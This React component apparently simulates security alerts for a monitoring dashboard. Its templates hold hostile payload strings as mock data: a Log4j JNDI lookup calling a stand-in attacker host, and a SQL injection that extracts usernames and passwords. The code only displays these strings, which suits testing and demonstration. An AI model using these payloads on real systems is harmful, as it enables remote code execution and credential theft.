import React, { useState } from 'react';
import { ThreatAlert } from '../types';
import { Play, Shield, Terminal, Zap, ShieldAlert, Cpu } from 'lucide-react';

interface SimulatorProps {
  onTriggerAlert: (alert: ThreatAlert) => void;
}

export const AlertSimulator: React.FC<SimulatorProps> = ({ onTriggerAlert }) => {
  const [isRunning, setIsRunning] = useState(false);
  const [activePayload, setActivePayload] = useState<string>('');
  const [targetIp, setTargetIp] = useState('');

  const attackTemplates = [
    {
      attackType: 'SSH Brute Force Sweep',
      severity: 'CRITICAL' as const,
      payload: 'PAM: authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=attacker.example.com user=root',
      country: 'China',
      countryCode: 'CN',
      port: 22,
      lat: 39.9042,
      lng: 116.4074,
      intensity: 95
    },
    {
      attackType: 'Log4j JNDI Lookup Attempt',
      severity: 'CRITICAL' as const,
      payload: '${jndi:ldap://compromised-node.attackers.com:1389/Exploit}',
      country: 'Russia',
      countryCode: 'RU',
      port: 8080,
      lat: 55.7558,
      lng: 37.6173,
      intensity: 90
    },
    {
      attackType: 'SQL Injection on API Gateway',
      severity: 'HIGH' as const,
      payload: "GET /api/v1/users?id=1' UNION SELECT username, password FROM users--",
      country: 'Netherlands',
      countryCode: 'NL',
      port: 443,
      lat: 52.3676,
      lng: 4.9041,
      intensity: 80
    },
    {
      attackType: 'DNS Amplification Attack Vector',
      severity: 'MEDIUM' as const,
      payload: 'ANY query request amplification multiplier x56.7',
      country: 'United States',
      countryCode: 'US',
      port: 53,
      lat: 37.7749,
      lng: -122.4194,
      intensity: 60
    },
    {
      attackType: 'Port Scanning Sweeps',
      severity: 'LOW' as const,
      payload: 'TCP SYN Packet Sweep detected from generic ISP node',
      country: 'Spain',
      countryCode: 'ES',
      port: 445,
      lat: 40.4168,
      lng: -3.7038,
      intensity: 40
    },
    {
      attackType: 'Botnet C2 Beacon Detection',
      severity: 'HIGH' as const,
      payload: 'Mirai variant heartbeat detected - C2 callback interval 30s',
      country: 'Australia',
      countryCode: 'AU',
      port: 4444,
      lat: -33.8688,
      lng: 151.2093,
      intensity: 75
    }
  ];

  const triggerAttack = (template: typeof attackTemplates[0]) => {
    setActivePayload(template.payload);
    const mockAlert: ThreatAlert = {
      id: `ALT-${Date.now()}`,
      timestamp: new Date().toLocaleTimeString(),
      sourceIp: `203.${Math.floor(Math.random() * 254) + 1}.${Math.floor(Math.random() * 254)}.${Math.floor(Math.random() * 254)}`,
      destinationIp: targetIp || 'target.local',
      sourcePort: Math.floor(Math.random() * 64000) + 1024,
      destinationPort: template.port,
      country: template.country,
      countryCode: template.countryCode,
      severity: template.severity,
      attackType: template.attackType,
      payload: template.payload,
      latitude: template.lat + (Math.random() - 0.5) * 2,
      longitude: template.lng + (Math.random() - 0.5) * 2,
      intensity: template.intensity
    };
    onTriggerAlert(mockAlert);
  };

  const handleSequenceStart = () => {
    if (isRunning) return;
    setIsRunning(true);
    let index = 0;
    const interval = setInterval(() => {
      if (index >= attackTemplates.length) {
        clearInterval(interval);
        setIsRunning(false);
        return;
      }
      triggerAttack(attackTemplates[index]);
      index++;
    }, 2500);
  };

  return (
    <div id="sim-control-panel" className="bg-brand-panel border border-brand-border p-5 rounded-lg space-y-4">
      <div className="flex justify-between items-center w-full mb-2">
        <h3 className="text-sm font-bold font-sans text-brand-red tracking-wider flex items-center gap-2">
          <ShieldAlert size={16} /> SIMULADOR DE ALERTAS PRO & PAYLOAD TESTING
        </h3>
        <span className="text-[10px] bg-brand-red/25 text-brand-red font-mono px-2 py-0.5 border border-brand-red/40 rounded animate-pulse">
          {isRunning ? 'SECUENCIA ACTIVA' : 'SISTEMA LISTO'}
        </span>
      </div>

      <p className="text-zinc-400 font-sans text-xs">
        Pruebe la resistencia de su SOC e inspeccione cómo reacciona la visualización al inyectar paquetes maliciosos en tiempo real.
      </p>

      <div className="grid md:grid-cols-2 gap-4">
        <div className="space-y-3">
          <div>
            <label className="block text-[10px] text-zinc-500 font-mono mb-1">IP DEL OBJETIVO BAJO TEST (TARGET)</label>
            <input
              type="text"
              value={targetIp}
              onChange={(e) => setTargetIp(e.target.value)}
              placeholder="Ej. 192.168.1.100"
              className="w-full bg-[#0b121f] border border-brand-border rounded p-2 text-xs text-white font-mono focus:border-brand-red focus:outline-none"
            />
          </div>

          <div className="flex gap-2">
            <button
              onClick={handleSequenceStart}
              disabled={isRunning}
              className="flex-1 flex justify-center items-center gap-2 text-xs font-sans font-bold py-2.5 px-4 rounded transition bg-brand-red hover:opacity-90 text-white disabled:opacity-50"
            >
              <Play size={14} /> Secuencia Completa SOC
            </button>
          </div>
        </div>

        <div className="space-y-2">
          <span className="block text-[10px] text-zinc-500 font-mono">LANZAR PAYLOAD UNITARIO</span>
          <div className="grid grid-cols-2 gap-1.5">
            {attackTemplates.map((tpl, i) => (
              <button
                key={i}
                onClick={() => triggerAttack(tpl)}
                className="text-left bg-[#0b121f] hover:bg-brand-panel border border-brand-border rounded p-1.5 transition text-[10px] text-zinc-300 font-mono truncate hover:border-brand-red/50"
              >
                ⚡ {tpl.attackType}
              </button>
            ))}
          </div>
        </div>
      </div>

      {activePayload && (
        <div id="payload-terminal-display" className="bg-[#05070a]/90 p-3 rounded border border-brand-border font-mono text-xs text-brand-red space-y-1">
          <div className="flex items-center gap-2 text-[10px] text-white bg-brand-panel px-2 py-0.5 rounded w-max">
            <Terminal size={12} /> PAYLOAD STRING DETECTADO
          </div>
          <p className="line-clamp-2 select-all cursor-pointer">{activePayload}</p>
        </div>
      )}
    </div>
  );
};
